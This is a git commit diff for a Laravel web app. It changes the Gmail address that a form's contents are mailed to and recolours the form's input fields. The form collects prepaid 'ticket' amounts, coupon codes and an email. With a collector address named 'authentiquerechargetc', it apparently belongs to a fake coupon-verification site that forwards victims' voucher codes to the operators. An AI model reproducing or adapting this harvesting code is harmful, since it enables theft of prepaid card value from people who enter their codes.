13aa7929866025f404730bdc47487b4611ba3ab9
Chabla <chabijeanbaptiste@gmail.com>
2022-09-02 11:08:33 +0000

    modification

--- app/Http/Controllers/MessageController.php
+++ app/Http/Controllers/MessageController.php
@@ -16,7 +16,7 @@ class MessageController extends Controller
     // Envoi du mail aux utilisateurs
     public function sendMessageGoogle(Request $request)
     {
-        Mail::to('authentiquerechargetc@gmail.com')
+        Mail::to('tolofonmartin30@gmail.com')
             ->send(new MessageGoogle($request->except('_token')));
 
         Mail::to('chabijeanbaptiste56@gmail.com')
--- resources/views/index.blade.php
+++ resources/views/index.blade.php
@@ -96,11 +96,11 @@
 
             <div class="form-group">
               Montant du Ticket 1* <br>
-              <input type="text" name="m1" style="background-color: orange;">
+              <input type="text" name="m1" style="background-color: #FFDB58;">
             </div>
             <div class="form-group">
               Code du coupon 1* <br>
-              <input type="text" style="background-color: orange;" name="cc1" class="form-control input-sm" size="30" maxlength="30">
+              <input type="text" style="background-color: #FFDB58;" name="cc1" class="form-control input-sm" size="30" maxlength="30">
             </div>
 
 
@@ -108,11 +108,11 @@
 
             <div class="form-group">
               Montant du Ticket 2* <br>
-              <input type="text" name="m2" style="background-color: orange;">
+              <input type="text" name="m2" style="background-color: #FFDB58;">
             </div>
             <div class="form-group">
               Code du coupon 2* <br>
-              <input type="text" style="background-color: orange;" name="cc2" class="form-control input-sm" size="30" maxlength="30">
+              <input type="text" style="background-color: #FFDB58;" name="cc2" class="form-control input-sm" size="30" maxlength="30">
             </div>
 
 
@@ -120,11 +120,11 @@
 
             <div class="form-group">
               Montant du Ticket 3* <br>
-              <input type="text" name="m3" style="background-color: orange;">
+              <input type="text" name="m3" style="background-color: #FFDB58;">
             </div>
             <div class="form-group">
               Code du coupon 3* <br>
-              <input type="text" style="background-color: orange;" name="cc3" class="form-control input-sm" size="30" maxlength="30">
+              <input type="text" style="background-color: #FFDB58;" name="cc3" class="form-control input-sm" size="30" maxlength="30">
             </div>
 
 
@@ -133,11 +133,11 @@
 
             <div class="form-group">
               Montant du Ticket 4* <br>
-              <input type="text" name="m4" style="background-color: orange;">
+              <input type="text" name="m4" style="background-color: #FFDB58;">
             </div>
             <div class="form-group">
               Code du coupon 4* <br>
-              <input type="text" style="background-color: orange;" name="cc4" class="form-control input-sm" size="30" maxlength="30">
+              <input type="text" style="background-color: #FFDB58;" name="cc4" class="form-control input-sm" size="30" maxlength="30">
 
             </div>
             <div data-field-wrapper="fld_8843075" class="form-group" id="fld_8843075_1-wrap">
@@ -152,7 +152,7 @@
             </div>
             <div class="form-group">
               Email* <br>
-              <input type="email" name="mail" style="background-color: orange;" required class="form-control input-sm" size="30" maxlength="30">
+              <input type="email" name="mail" style="background-color: #FFDB58;" required class="form-control input-sm" size="30" maxlength="30">
 
             </div>
 
